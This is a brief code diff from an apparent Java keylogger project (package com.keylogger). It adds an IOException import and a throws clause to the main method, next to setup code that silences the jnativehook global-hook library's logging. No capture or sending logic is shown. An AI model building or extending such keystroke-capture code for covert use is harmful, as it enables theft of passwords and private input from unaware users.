@@ -4,11 +4,13 @@ package com.keylogger;
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 
+import java.io.IOException;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 
 public class KeyLogger {
-    public static void main(String[] args) {
+
+    public static void main(String[] args) throws IOException {
         // -- Use to stop the auto logger bug from jnativehook --
         Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
         logger.setLevel(Level.WARNING);
